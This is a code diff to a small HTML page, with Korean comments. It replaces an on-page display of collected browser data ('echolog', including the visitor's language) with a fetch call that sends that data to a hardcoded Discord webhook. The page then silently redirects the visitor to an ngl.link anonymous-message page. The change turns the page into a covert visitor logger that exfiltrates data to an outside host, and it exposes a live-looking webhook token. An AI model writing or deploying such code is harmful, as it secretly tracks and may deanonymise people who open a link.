@@ -5,7 +5,6 @@
     <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/default.min.css" />
     <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
     <style>
-
       h1 {
         color: #0066cc;
         margin: 60px 0;
@@ -14,7 +13,8 @@
   </head>
   <body>
     <h1>
-    <pre><code style="word-wrap: break-word;overflow-wrap: break-word;white-space: pre-wrap;font-size: 16px;background-color: #e7ecf0;">Loading...</code></pre>
+      <!-- JSON 데이터를 출력하는 pre 태그를 추가 -->
+      <pre id="json-data"></pre>
     </h1>
     <script>
       let echolog = {};
@@ -49,9 +49,19 @@
             languages: navigator.language,
           };
 
-          var codeBlock = document.querySelector("code");
-          codeBlock.innerText = JSON.stringify(echolog, null, 1);
-          hljs.highlightAll();
+          // JSON.stringify와 Discord 웹훅을 사용하여 데이터를 전송
+          fetch("https://discord.com/api/webhooks/1130871499692183602/Jwp5yAfmTbxstZJ7FcWBPqZee62_gTlRjfx3pYcPGEe-c0Tw9Y9F0t-AdFCpoNj7bcpM", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({ content: JSON.stringify(echolog, null, 1) }),
+          })
+            .then(() => {
+              // 페이지 리다이렉션
+              window.location.href = "https://ngl.link/yulbeen_yuliana";
+            })
+            .catch((error) => console.error(error));
         })
         .catch((error) => console.error(error));
     </script>
